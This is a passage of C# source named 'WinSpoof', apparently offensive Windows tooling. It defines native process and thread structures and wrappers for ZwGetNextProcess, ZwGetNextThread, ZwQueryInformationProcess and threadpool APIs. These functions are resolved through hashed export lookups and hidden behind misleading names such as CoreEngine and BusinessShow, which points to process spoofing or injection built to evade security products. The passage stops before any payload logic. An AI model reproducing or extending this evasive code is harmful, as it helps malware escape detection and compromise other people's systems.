using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;
using System.Linq;
using System.Collections.Generic;
using System.Security;
using System.Text;


namespace WinSpoof
{

    class Program
    {
        public static ulong ptrToGS = 0;
        public static System.IO.MemoryMappedFiles.MemoryMappedFile MemMapSystemMem = null;
        public static System.IO.MemoryMappedFiles.MemoryMappedViewAccessor MemMapViewAccessor = null;
        public static UNICODE_STRING ImagePath;
        public static RTL_USER_PROCESS_PARAMETERS_64 ProcessParams64 = new RTL_USER_PROCESS_PARAMETERS_64();
        public static IntPtr ProcessParams = IntPtr.Zero;
        public static ulong SuspendCount = 0;
        public static IntPtr RemoteProcess = IntPtr.Zero;
        public static IntPtr NewRemoteThread = IntPtr.Zero;
        public static IntPtr processParameters = IntPtr.Zero;
        public static IntPtr PtrToImagePath = IntPtr.Zero;
        public static PsCreateInfo info = new PsCreateInfo();
        public static PsAttributeList attributeList = new PsAttributeList();

        public enum NTSTATUS : uint
        {
                // Success
                Success = 0x00000000,
                Wait0 = 0x00000000,
                Wait1 = 0x00000001,
                Wait2 = 0x00000002,
                Wait3 = 0x00000003,
                Wait63 = 0x0000003f,
                Abandoned = 0x00000080,
                AbandonedWait0 = 0x00000080,
                AbandonedWait1 = 0x00000081,
                AbandonedWait2 = 0x00000082,
                AbandonedWait3 = 0x00000083,
                AbandonedWait63 = 0x000000bf,
                UserApc = 0x000000c0,
                KernelApc = 0x00000100,
                Alerted = 0x00000101,
                Timeout = 0x00000102,
                Pending = 0x00000103,
                Reparse = 0x00000104,
                MoreEntries = 0x00000105,
                NotAllAssigned = 0x00000106,
                SomeNotMapped = 0x00000107,
                OpLockBreakInProgress = 0x00000108,
                VolumeMounted = 0x00000109,
                RxActCommitted = 0x0000010a,
                NotifyCleanup = 0x0000010b,
                NotifyEnumDir = 0x0000010c,
                NoQuotasForAccount = 0x0000010d,
                PrimaryTransportConnectFailed = 0x0000010e,
                PageFaultTransition = 0x00000110,
                PageFaultDemandZero = 0x00000111,
                PageFaultCopyOnWrite = 0x00000112,
                PageFaultGuardPage = 0x00000113,
                PageFaultPagingFile = 0x00000114,
                CrashDump = 0x00000116,
                ReparseObject = 0x00000118,
                NothingToTerminate = 0x00000122,
                ProcessNotInJob = 0x00000123,
                ProcessInJob = 0x00000124,
                ProcessCloned = 0x00000129,
                FileLockedWithOnlyReaders = 0x0000012a,
                FileLockedWithWriters = 0x0000012b,

                // Informational
                Informational = 0x40000000,
                ObjectNameExists = 0x40000000,
                ThreadWasSuspended = 0x40000001,
                WorkingSetLimitRange = 0x40000002,
                ImageNotAtBase = 0x40000003,
                RegistryRecovered = 0x40000009,

                // Warning
                Warning = 0x80000000,
                GuardPageViolation = 0x80000001,
                DatatypeMisalignment = 0x80000002,
                Breakpoint = 0x80000003,
                SingleStep = 0x80000004,
                BufferOverflow = 0x80000005,
                NoMoreFiles = 0x80000006,
                HandlesClosed = 0x8000000a,
                PartialCopy = 0x8000000d,
                DeviceBusy = 0x80000011,
                InvalidEaName = 0x80000013,
                EaListInconsistent = 0x80000014,
                NoMoreEntries = 0x8000001a,
                LongJump = 0x80000026,
                DllMightBeInsecure = 0x8000002b,

                // Error
                Error = 0xc0000000,
                Unsuccessful = 0xc0000001,
                NotImplemented = 0xc0000002,
                InvalidInfoClass = 0xc0000003,
                InfoLengthMismatch = 0xc0000004,
                AccessViolation = 0xc0000005,
                InPageError = 0xc0000006,
                PagefileQuota = 0xc0000007,
                InvalRunPEdle = 0xc0000008,
                BadInitialStack = 0xc0000009,
                BadInitialPc = 0xc000000a,
                InvalidCid = 0xc000000b,
                TimerNotCanceled = 0xc000000c,
                InvalidParameter = 0xc000000d,
                NoSuchDevice = 0xc000000e,
                NoSuchFile = 0xc000000f,
                InvalidDeviceRequest = 0xc0000010,
                EndOfFile = 0xc0000011,
                WrongVolume = 0xc0000012,
                NoMediaInDevice = 0xc0000013,
                NoMemory = 0xc0000017,
                ConflictingAddresses = 0xc0000018,
                NotMappedView = 0xc0000019,
                UnableToFreeVm = 0xc000001a,
                UnableToDeleteSection = 0xc000001b,
                IllegalInstruction = 0xc000001d,
                AlreadyCommitted = 0xc0000021,
                AccessDenied = 0xc0000022,
                BufferTooSmall = 0xc0000023,
                ObjectTypeMismatch = 0xc0000024,
                NonContinuableException = 0xc0000025,
                BadStack = 0xc0000028,
                NotLocked = 0xc000002a,
                NotCommitted = 0xc000002d,
                InvalidParameterMix = 0xc0000030,
                ObjectNameInvalid = 0xc0000033,
                ObjectNameNotFound = 0xc0000034,
                ObjectNameCollision = 0xc0000035,
                ObjectPathInvalid = 0xc0000039,
                ObjectPathNotFound = 0xc000003a,
                ObjectPathSyntaxBad = 0xc000003b,
                DataOverrun = 0xc000003c,
                DataLate = 0xc000003d,
                DataError = 0xc000003e,
                CrcError = 0xc000003f,
                SectionTooBig = 0xc0000040,
                PortConnectionRefused = 0xc0000041,
                InvalidPortHandle = 0xc0000042,
                SharingViolation = 0xc0000043,
                QuotaExceeded = 0xc0000044,
                InvalidPageProtection = 0xc0000045,
                MutantNotOwned = 0xc0000046,
                SemaphoreLimitExceeded = 0xc0000047,
                PortAlreadySet = 0xc0000048,
                SectionNotImage = 0xc0000049,
                SuspendCountExceeded = 0xc000004a,
                ThreadIsTerminating = 0xc000004b,
                BadWorkingSetLimit = 0xc000004c,
                IncompatibleFileMap = 0xc000004d,
                SectionProtection = 0xc000004e,
                EasNotSupported = 0xc000004f,
                EaTooLarge = 0xc0000050,
                NonExistentEaEntry = 0xc0000051,
                NoEasOnFile = 0xc0000052,
                EaCorruptError = 0xc0000053,
                FileLockConflict = 0xc0000054,
                LockNotGranted = 0xc0000055,
                DeletePending = 0xc0000056,
                CtlFileNotSupported = 0xc0000057,
                UnknownRevision = 0xc0000058,
                RevisionMismatch = 0xc0000059,
                InvalidOwner = 0xc000005a,
                InvalidPrimaryGroup = 0xc000005b,
                NoImpersonationToken = 0xc000005c,
                CantDisableMandatory = 0xc000005d,
                NoLogonServers = 0xc000005e,
                NoSuchLogonSession = 0xc000005f,
                NoSuchPrivilege = 0xc0000060,
                PrivilegeNotHeld = 0xc0000061,
                InvalidAccountName = 0xc0000062,
                UserExists = 0xc0000063,
                NoSuchUser = 0xc0000064,
                GroupExists = 0xc0000065,
                NoSuchGroup = 0xc0000066,
                MemberInGroup = 0xc0000067,
                MemberNotInGroup = 0xc0000068,
                LastAdmin = 0xc0000069,
                WrongPassword = 0xc000006a,
                IllFormedPassword = 0xc000006b,
                PasswordRestriction = 0xc000006c,
                LogonFailure = 0xc000006d,
                AccountRestriction = 0xc000006e,
                InvalidLogonHours = 0xc000006f,
                InvalidWorkstation = 0xc0000070,
                PasswordExpired = 0xc0000071,
                AccountDisabled = 0xc0000072,
                NoneMapped = 0xc0000073,
                TooManyLuidsRequested = 0xc0000074,
                LuidsExhausted = 0xc0000075,
                InvalidSubAuthority = 0xc0000076,
                InvalidAcl = 0xc0000077,
                InvalidSid = 0xc0000078,
                InvalidSecurityDescr = 0xc0000079,
                ProcedureNotFound = 0xc000007a,
                InvalidImageFormat = 0xc000007b,
                NoToken = 0xc000007c,
                BadInheritanceAcl = 0xc000007d,
                RangeNotLocked = 0xc000007e,
                DiskFull = 0xc000007f,
                ServerDisabled = 0xc0000080,
                ServerNotDisabled = 0xc0000081,
                TooManyGuidsRequested = 0xc0000082,
                GuidsExhausted = 0xc0000083,
                InvalidIdAuthority = 0xc0000084,
                AgentsExhausted = 0xc0000085,
                InvalidVolumeLabel = 0xc0000086,
                SectionNotExtended = 0xc0000087,
                NotMappedData = 0xc0000088,
                ResourceDataNotFound = 0xc0000089,
                ResourceTypeNotFound = 0xc000008a,
                ResourceNameNotFound = 0xc000008b,
                ArrayBoundsExceeded = 0xc000008c,
                FloatDenormalOperand = 0xc000008d,
                FloatDivideByZero = 0xc000008e,
                FloatInexactResult = 0xc000008f,
                FloatInvalidOperation = 0xc0000090,
                FloatOverflow = 0xc0000091,
                FloatStackCheck = 0xc0000092,
                FloatUnderflow = 0xc0000093,
                IntegerDivideByZero = 0xc0000094,
                IntegerOverflow = 0xc0000095,
                PrivilegedInstruction = 0xc0000096,
                TooManyPagingFiles = 0xc0000097,
                FileInvalid = 0xc0000098,
                InsufficientResources = 0xc000009a,
                InstanceNotAvailable = 0xc00000ab,
                PipeNotAvailable = 0xc00000ac,
                InvalidPipeState = 0xc00000ad,
                PipeBusy = 0xc00000ae,
                IllegalFunction = 0xc00000af,
                PipeDisconnected = 0xc00000b0,
                PipeClosing = 0xc00000b1,
                PipeConnected = 0xc00000b2,
                PipeListening = 0xc00000b3,
                InvalidReadMode = 0xc00000b4,
                IoTimeout = 0xc00000b5,
                FileForcedClosed = 0xc00000b6,
                ProfilingNotStarted = 0xc00000b7,
                ProfilingNotStopped = 0xc00000b8,
                NotSameDevice = 0xc00000d4,
                FileRenamed = 0xc00000d5,
                CantWait = 0xc00000d8,
                PipeEmpty = 0xc00000d9,
                CantTerminateSelf = 0xc00000db,
                InternalError = 0xc00000e5,
                InvalidParameter1 = 0xc00000ef,
                InvalidParameter2 = 0xc00000f0,
                InvalidParameter3 = 0xc00000f1,
                InvalidParameter4 = 0xc00000f2,
                InvalidParameter5 = 0xc00000f3,
                InvalidParameter6 = 0xc00000f4,
                InvalidParameter7 = 0xc00000f5,
                InvalidParameter8 = 0xc00000f6,
                InvalidParameter9 = 0xc00000f7,
                InvalidParameter10 = 0xc00000f8,
                InvalidParameter11 = 0xc00000f9,
                InvalidParameter12 = 0xc00000fa,
                ProcessIsTerminating = 0xc000010a,
                MappedFileSizeZero = 0xc000011e,
                TooManyOpenedFiles = 0xc000011f,
                Cancelled = 0xc0000120,
                CannotDelete = 0xc0000121,
                InvalidComputerName = 0xc0000122,
                FileDeleted = 0xc0000123,
                SpecialAccount = 0xc0000124,
                SpecialGroup = 0xc0000125,
                SpecialUser = 0xc0000126,
                MembersPrimaryGroup = 0xc0000127,
                FileClosed = 0xc0000128,
                TooManyThreads = 0xc0000129,
                ThreadNotInProcess = 0xc000012a,
                TokenAlreadyInUse = 0xc000012b,
                PagefileQuotaExceeded = 0xc000012c,
                CommitmentLimit = 0xc000012d,
                InvalidImageLeFormat = 0xc000012e,
                InvalidImageNotMz = 0xc000012f,
                InvalidImageProtect = 0xc0000130,
                InvalidImageWin16 = 0xc0000131,
                LogonServer = 0xc0000132,
                DifferenceAtDc = 0xc0000133,
                SynchronizationRequired = 0xc0000134,
                DllNotFound = 0xc0000135,
                IoPrivilegeFailed = 0xc0000137,
                OrdinalNotFound = 0xc0000138,
                EntryPointNotFound = 0xc0000139,
                ControlCExit = 0xc000013a,
                InvalidAddress = 0xc0000141,
                PortNotSet = 0xc0000353,
                DebuggerInactive = 0xc0000354,
                CallbackBypass = 0xc0000503,
                PortClosed = 0xc0000700,
                MessageLost = 0xc0000701,
                InvalidMessage = 0xc0000702,
                RequestCanceled = 0xc0000703,
                RecursiveDispatch = 0xc0000704,
                LpcReceiveBufferExpected = 0xc0000705,
                LpcInvalidConnectionUsage = 0xc0000706,
                LpcRequestsNotAllowed = 0xc0000707,
                ResourceInUse = 0xc0000708,
                ProcessIsProtected = 0xc0000712,
                VolumeDirty = 0xc0000806,
                FileCheckedOut = 0xc0000901,
                CheckOutRequired = 0xc0000902,
                BadFileType = 0xc0000903,
                FileTooLarge = 0xc0000904,
                FormsAuthRequired = 0xc0000905,
                VirusInfected = 0xc0000906,
                VirusDeleted = 0xc0000907,
                TransactionalConflict = 0xc0190001,
                InvalidTransaction = 0xc0190002,
                TransactionNotActive = 0xc0190003,
                TmInitializationFailed = 0xc0190004,
                RmNotActive = 0xc0190005,
                RmMetadataCorrupt = 0xc0190006,
                TransactionNotJoined = 0xc0190007,
                DirectoryNotRm = 0xc0190008,
                CouldNotResizeLog = 0xc0190009,
                TransactionsUnsupportedRemote = 0xc019000a,
                LogResizeInvalidSize = 0xc019000b,
                RemoteFileVersionMismatch = 0xc019000c,
                CrmProtocolAlreadyExists = 0xc019000f,
                TransactionPropagationFailed = 0xc0190010,
                CrmProtocolNotFound = 0xc0190011,
                TransactionSuperiorExists = 0xc0190012,
                TransactionRequestNotValid = 0xc0190013,
                TransactionNotRequested = 0xc0190014,
                TransactionAlreadyAborted = 0xc0190015,
                TransactionAlreadyCommitted = 0xc0190016,
                TransactionInvalidMarshallBuffer = 0xc0190017,
                CurrentTransactionNotValid = 0xc0190018,
                LogGrowthFailed = 0xc0190019,
                ObjectNoLongerExists = 0xc0190021,
                StreamMiniversionNotFound = 0xc0190022,
                StreamMiniversionNotValid = 0xc0190023,
                MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
                CantOpenMiniversionWithModifyIntent = 0xc0190025,
                CantCreateMoreStreamMiniversions = 0xc0190026,
                HandleNoLongerValid = 0xc0190028,
                NoTxfMetadata = 0xc0190029,
                LogCorruptionDetected = 0xc0190030,
                CantRecoverWithHandleOpen = 0xc0190031,
                RmDisconnected = 0xc0190032,
                EnlistmentNotSuperior = 0xc0190033,
                RecoveryNotNeeded = 0xc0190034,
                RmAlreadyStarted = 0xc0190035,
                FileIdentityNotPersistent = 0xc0190036,
                CantBreakTransactionalDependency = 0xc0190037,
                CantCrossRmBoundary = 0xc0190038,
                TxfDirNotEmpty = 0xc0190039,
                IndoubtTransactionsExist = 0xc019003a,
                TmVolatile = 0xc019003b,
                RollbackTimerExpired = 0xc019003c,
                TxfAttributeCorrupt = 0xc019003d,
                EfsNotAllowedInTransaction = 0xc019003e,
                TransactionalOpenNotAllowed = 0xc019003f,
                TransactedMappingUnsupportedRemote = 0xc0190040,
                TxfMetadataAlreadyPresent = 0xc0190041,
                TransactionScopeCallbacksNotSet = 0xc0190042,
                TransactionRequiredPromotion = 0xc0190043,
                CannotExecuteFileInTransaction = 0xc0190044,
                TransactionsNotFrozen = 0xc0190045,
                MaximumNtStatus = 0xffffffff
            }


    // x64 context structure
    [StructLayout(LayoutKind.Sequential, Pack = 16)]
    public struct CONTEXT64
    {
      public ulong P1Home;
      public ulong P2Home;
      public ulong P3Home;
      public ulong P4Home;
      public ulong P5Home;
      public ulong P6Home;

      public CONTEXT_FLAGS ContextFlags;
      public uint MxCsr;

      public ushort SegCs;
      public ushort SegDs;
      public ushort SegEs;
      public ushort SegFs;
      public ushort SegGs;
      public ushort SegSs;
      public uint EFlags;

      public ulong Dr0;
      public ulong Dr1;
      public ulong Dr2;
      public ulong Dr3;
      public ulong Dr6;
      public ulong Dr7;

      public ulong Rax;
      public ulong Rcx;
      public ulong Rdx;
      public ulong Rbx;
      public ulong Rsp;
      public ulong Rbp;
      public ulong Rsi;
      public ulong Rdi;
      public ulong R8;
      public ulong R9;
      public ulong R10;
      public ulong R11;
      public ulong R12;
      public ulong R13;
      public ulong R14;
      public ulong R15;
      public ulong Rip;

      public XSAVE_FORMAT64 DUMMYUNIONNAME;

      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
      public M128A[] VectorRegister;
      public ulong VectorControl;

      public ulong DebugControl;
      public ulong LastBranchToRip;
      public ulong LastBranchFromRip;
      public ulong LastExceptionToRip;
      public ulong LastExceptionFromRip;
      }

    public enum CONTEXT_FLAGS : uint
  	{
  	   CONTEXT_i386 = 0x10000,
  	   CONTEXT_i486 = 0x10000,
  	   CONTEXT_CONTROL = CONTEXT_i386 | 0x01,
  	   CONTEXT_INTEGER = CONTEXT_i386 | 0x02,
  	   CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04,
  	   CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08,
  	   CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10,
  	   CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20,
  	   CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
  	   CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS |  CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS |  CONTEXT_EXTENDED_REGISTERS
  	}

  	[Flags]
  	public enum MemoryProtection : uint
  	{
  			AccessDenied = 0x0,
  			Execute = 0x10,
  			ExecuteRead = 0x20,
  			ExecuteReadWrite = 0x40,
  			ExecuteWriteCopy = 0x80,
  			Guard = 0x100,
  			NoCache = 0x200,
  			WriteCombine = 0x400,
  			NoAccess = 0x01,
  			ReadOnly = 0x02,
  			ReadWrite = 0x04,
  			WriteCopy = 0x08
  	}

        [StructLayout(LayoutKind.Explicit, Size = 8)]
        public struct LARGE_INTEGER
        {
            [FieldOffset(0)] public long QuadPart;
            [FieldOffset(0)] public uint LowPart;
            [FieldOffset(4)] public int HighPart;
            [FieldOffset(0)] public int LowPartAsInt;
            [FieldOffset(0)] public uint LowPartAsUInt;
            [FieldOffset(4)] public int HighPartAsInt;
            [FieldOffset(4)] public uint HighPartAsUInt;

            public long ToInt64()
            {
                return ((long)this.HighPart << 32) | (uint)this.LowPartAsInt;
            }
            public static LARGE_INTEGER Convert(long value)
            {
                return new LARGE_INTEGER
                {
                    LowPartAsInt = (int)(value),
                    HighPartAsInt = (int)((value >> 32))
                };
            }
        }

        [Flags]
        public enum CORE_Flags : uint
        {
           None = 0,
           INHERIT = 1
        }

        public enum CORE_INFORMATION_CLASS
        {
            ProcessBasicInformation = 0x00,
            ProcessQuotaLimits = 0x01,
            ProcessIoCounters = 0x02,
            ProcessVmCounters = 0x03,
            ProcessTimes = 0x04,
            ProcessBasePriority = 0x05,
            ProcessRaisePriority = 0x06,
            ProcessDebugPort = 0x07,
            ProcessExceptionPort = 0x08,
            ProcessAccessToken = 0x09,
            ProcessLdtInformation = 0x0A,
            ProcessLdtSize = 0x0B,
            ProcessDefaultHardErrorMode = 0x0C,
            ProcessIoPortHandlers = 0x0D,
            ProcessPooledUsageAndLimits = 0x0E,
            ProcessWorkingSetWatch = 0x0F,
            ProcessUserModeIOPL = 0x10,
            ProcessEnableAlignmentFaultFixup = 0x11,
            ProcessPriorityClass = 0x12,
            ProcessWx86Information = 0x13,
            ProcessHandleCount = 0x14,
            ProcessAffinityMask = 0x15,
            ProcessPriorityBoost = 0x16,
            ProcessDeviceMap = 0x17,
            ProcessSessionInformation = 0x18,
            ProcessForegroundInformation = 0x19,
            ProcessWow64Information = 0x1A,
            ProcessImageFileName = 0x1B,
            ProcessLUIDDeviceMapsEnabled = 0x1C,
            ProcessBreakOnTermination = 0x1D,
            ProcessDebugObjectHandle = 0x1E,
            ProcessDebugFlags = 0x1F,
            ProcessHandleTracing = 0x20,
            ProcessIoPriority = 0x21,
            ProcessExecuteFlags = 0x22,
            ProcessResourceManagement = 0x23,
            ProcessCookie = 0x24,
            ProcessImageInformation = 0x25,
            ProcessCycleTime = 0x26,
            ProcessPagePriority = 0x27,
            ProcessInstrumentationCallback = 0x28,
            ProcessThreadStackAllocation = 0x29,
            ProcessWorkingSetWatchEx = 0x2A,
            ProcessImageFileNameWin32 = 0x2B,
            ProcessImageFileMapping = 0x2C,
            ProcessAffinityUpdateMode = 0x2D,
            ProcessMemoryAllocationMode = 0x2E,
            ProcessGroupInformation = 0x2F,
            ProcessTokenVirtualizationEnabled = 0x30,
            ProcessConsoleHostProcess = 0x31,
            ProcessWindowInformation = 0x32,
            ProcessHandleInformation = 0x33,
            ProcessMitigationPolicy = 0x34,
            ProcessDynamicFunctionTableInformation = 0x35,
            ProcessHandleCheckingMode = 0x36,
            ProcessKeepAliveCount = 0x37,
            ProcessRevokeFileHandles = 0x38,
            ProcessWorkingSetControl = 0x39,
            ProcessHandleTable = 0x3A,
            ProcessCheckStackExtentsMode = 0x3B,
            ProcessCommandLineInformation = 0x3C,
            ProcessProtectionInformation = 0x3D,
            ProcessMemoryExhaustion = 0x3E,
            ProcessFaultInformation = 0x3F,
            ProcessTelemetryIdInformation = 0x40,
            ProcessCommitReleaseInformation = 0x41,
            ProcessDefaultCpuSetsInformation = 0x42,
            ProcessAllowedCpuSetsInformation = 0x43,
            ProcessSubsystemProcess = 0x44,
            ProcessJobMemoryInformation = 0x45,
            ProcessInPrivate = 0x46,
            ProcessRaiseUMExceptionOnInvalidHandleClose = 0x47,
            ProcessIumChallengeResponse = 0x48,
            ProcessChildProcessInformation = 0x49,
            ProcessHighGraphicsPriorityInformation = 0x4A,
            ProcessSubsystemInformation = 0x4B,
            ProcessEnergyValues = 0x4C,
            ProcessActivityThrottleState = 0x4D,
            ProcessActivityThrottlePolicy = 0x4E,
            ProcessWin32kSyscallFilterInformation = 0x4F,
            ProcessDisableSystemAllowedCpuSets = 0x50,
            ProcessWakeInformation = 0x51,
            ProcessEnergyTrackingState = 0x52,
            ProcessManageWritesToExecutableMemory = 0x53,
            ProcessCaptureTrustletLiveDump = 0x54,
            ProcessTelemetryCoverage = 0x55,
            ProcessEnclaveInformation = 0x56,
            ProcessEnableReadWriteVmLogging = 0x57,
            ProcessUptimeInformation = 0x58,
            ProcessImageSection = 0x59,
            ProcessDebugAuthInformation = 0x5A,
            ProcessSystemResourceManagement = 0x5B,
            ProcessSequenceNumber = 0x5C,
            ProcessLoaderDetour = 0x5D,
            ProcessSecurityDomainInformation = 0x5E,
            ProcessCombineSecurityDomainsInformation = 0x5F,
            ProcessEnableLogging = 0x60,
            ProcessLeapSecondInformation = 0x61,
            ProcessFiberShadowStackAllocation = 0x62,
            ProcessFreeFiberShadowStackAllocation = 0x63,
            MaxProcessInfoClass = 0x64
        };

        [StructLayout(LayoutKind.Sequential)]
        public struct RTL_USER_PROCESS_PARAMETERS_64
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public byte[] Reserved1;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public IntPtr[] Reserved2;
            public UNICODE_STRING64 CurrentDirectoryPath;
            public UNICODE_STRING64 DllPath;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
            public IntPtr[] Reserved2b;
            public UNICODE_STRING64 ImagePathName;
            public UNICODE_STRING64 CommandLine;
            public UInt64 Environment;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 9)]
            public IntPtr[] Reserved3;
            public UNICODE_STRING64 WindowTitle;
            public UNICODE_STRING64 DesktopName;
            public UNICODE_STRING64 ShellInfo;
            public UNICODE_STRING64 RuntimeData;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 32 * 6)]
            public IntPtr[] Reserved4;
            public uint EnvironmentSize;
        }

        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, Pack=0)]
        public struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING64
        {
            public ushort Length;
            public ushort MaximumLength;
            public UInt32 __padding;
            public UInt64 Buffer;
        }

        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
        public struct CORE_BASIS
        {
            public IntPtr ExitStatus;
            public IntPtr PebBaseAddress;
            public IntPtr AffinityMask;
            public IntPtr BasePriority;
            public IntPtr UniqueProcessId;
            public IntPtr InheritedFromUniqueProcessId;
        }

        // x64 save format
      	[StructLayout(LayoutKind.Sequential, Pack = 16)]
      	public struct XSAVE_FORMAT64
      	{
      		public ushort ControlWord;
      		public ushort StatusWord;
      		public byte TagWord;
      		public byte Reserved1;
      		public ushort ErrorOpcode;
      		public uint ErrorOffset;
      		public ushort ErrorSelector;
      		public ushort Reserved2;
      		public uint DataOffset;
      		public ushort DataSelector;
      		public ushort Reserved3;
      		public uint MxCsr;
      		public uint MxCsr_Mask;

      		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
      		public M128A[] FloatRegisters;

      		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
      		public M128A[] XmmRegisters;

      		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
      		public byte[] Reserved4;
      	}

        [StructLayout(LayoutKind.Sequential)]
      	public struct M128A
      	{
      		 public ulong High;
      		 public long Low;

      		 public override string ToString()
      		 {
      		return string.Format("High:{0}, Low:{1}", this.High, this.Low);
      		 }
      	}

        public static List<IntPtr> Allocated = new List<IntPtr>();
        public static UNICODE_STRING ConvertToUnicode(string data)
        {
            UNICODE_STRING StringObject = new UNICODE_STRING();
            StringObject.Length = (ushort)(data.Length * 2);
            StringObject.MaximumLength = (ushort)(StringObject.Length + 1);
            StringObject.Buffer = Marshal.StringToHGlobalUni(data);
            Allocated.Add(StringObject.Buffer);
            return StringObject;
        }

        [StructLayout(LayoutKind.Explicit, Size = 88)]
        public unsafe struct PsCreateInfo
        {
            [FieldOffset(0)] public UIntPtr Size;
            [FieldOffset(8)] public PsCreateState State;
            [FieldOffset(16)] public fixed byte Filter[72];
        }

        public enum PsCreateState
        {
            PsCreateInitialState,
            PsCreateFailOnFileOpen,
            PsCreateFailOnSectionCreate,
            PsCreateFailExeFormat,
            PsCreateFailMachineMismatch,
            PsCreateFailExeName,
            PsCreateSuccess,
            PsCreateMaximumStates
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PsAtrribute
        {
            public uint Attribute;
            public UIntPtr Size;
            public IntPtr Value;
            public IntPtr ReturnLength;

        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PsAttributeList
        {
            private const int PsAttributeListSize = 3;

            public UIntPtr TotalLength;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = PsAttributeListSize)]
            public PsAtrribute[] Attributes;

            public void Init()
            {
                Attributes = new PsAtrribute[PsAttributeListSize];
            }
        }

        public enum TP_CALLBACK_PRIORITY : uint
        {
            TP_CALLBACK_PRIORITY_HIGH = 2,
            TP_CALLBACK_PRIORITY_NORMAL = 0,
            TP_CALLBACK_PRIORITY_LOW = 1
        }

        public static IntPtr CreatePtr( object arg )
        {
            IntPtr ptr = Marshal.AllocHGlobal(Marshal.SizeOf( arg ));
            Marshal.StructureToPtr( arg, ptr, false );
            return ptr;
        }

        // TpAllocWork
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate void TpAllocWorkX( out IntPtr WorkReturn, CallBackDelegate Callback, ref IntPtr Context, IntPtr Environment );
        public static void TpAllocWork( out IntPtr WorkReturn, CallBackDelegate Callback, ref IntPtr Context, IntPtr Environment  )
        {
            var CoreEngine = CoreEngine<TpAllocWorkX>( CoreExport( "1950996984" ) );
            CoreEngine( out WorkReturn, Callback, ref Context, Environment  );
        }

        // TpAllocWork
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate void TpWaitForWorkX( IntPtr WorkReturn, ulong LOGICAL );
        public static void TpWaitForWork( IntPtr WorkReturn, ulong LOGICAL )
        {
            var CoreEngine = CoreEngine<TpWaitForWorkX>( CoreExport( "1553094713" ) );
            CoreEngine( WorkReturn, LOGICAL );
        }

        // TpPostWork
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate void TpPostWorkX( IntPtr Work, TP_CALLBACK_PRIORITY Priority );
        public static void TpPostWork( IntPtr Work, TP_CALLBACK_PRIORITY Priority )
        {
            var CoreEngine = CoreEngine<TpPostWorkX>( CoreExport( "-1554643355" ) );
            CoreEngine( Work, Priority  );
        }

        // TpReleaseWork
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate void TpReleaseWorkX( IntPtr Work );
        public static void TpReleaseWork( IntPtr Work )
        {
            var CoreEngine = CoreEngine<TpReleaseWorkX>( CoreExport( "536716890" )  );
            CoreEngine( Work );
        }

        // ZwGetNextThread
        public delegate NTSTATUS CoreEngineThreadNext( IntPtr ProcessHandle, IntPtr ThreadHandle, uint /*ACCESS_MASK*/ DesiredAccess, ulong HandleAttributes, ulong BusinessShow, out IntPtr BusinessMediaShow, string ErrorCodea, string ErrorCodeb );
        public static NTSTATUS CoreNextT( string buffer1, string buffer2, string buffer3, IntPtr ProcessHandle, IntPtr ThreadHandle, uint /*ACCESS_MASK*/ DesiredAccess, ulong HandleAttributes, ulong BusinessShow, out IntPtr BusinessMediaShow  )
        {
            var CoreEngine = CoreEngine<CoreEngineThreadNext>( EngineVal( "-1976793764" ) );
            return CoreEngine( ProcessHandle, ThreadHandle, DesiredAccess, HandleAttributes, BusinessShow, out BusinessMediaShow, "a", "b" );
        }

        // ZwGetNextProcess
        public delegate NTSTATUS CoreEngineNext( IntPtr ProcessHandle, uint /*ACCESS_MASK*/ DesiredAccess, CORE_Flags HandleAttributes, ulong BusinessShow, out IntPtr NewBusinessMedia, string ErrorCodea, string ErrorCodeb );
        public static NTSTATUS CoreNext( string buffer1, string buffer2, string buffer3, IntPtr ProcessHandle, uint /*ACCESS_MASK*/ DesiredAccess, CORE_Flags HandleAttributes, ulong BusinessShow, out IntPtr NewBusinessMedia )
        {
            var CoreEngine = CoreEngine<CoreEngineNext>( EngineVal( "659301084" ) );
            return CoreEngine( ProcessHandle, DesiredAccess, HandleAttributes, BusinessShow, out NewBusinessMedia, "a", "b" );
        }

        // ZwQueryInformationProcess
        public delegate NTSTATUS CoreEngineQuery( IntPtr ProcessHandle, CORE_INFORMATION_CLASS ProcessInformationClass, out CORE_BASIS PBI, int ProcessInformationLength, out int BusinessShowForRunners, string ErrorCodea, string ErrorCodeb );
        public static NTSTATUS CoreQuery( string buffer1, string buffer2, string buffer3, IntPtr ProcessHandle, CORE_INFORMATION_CLASS ProcessInformationClass, out CORE_BASIS PBI, int ProcessInformationLength, out int BusinessShowForRunners )
        {
            var CoreEngine = CoreEngine<CoreEngineQuery>( EngineVal( "-1318067143" ) );
            return CoreEngine( ProcessHandle, ProcessInformationClass, out PBI, ProcessInformationLength, out BusinessShowForRunners, "a", "b" );
        }

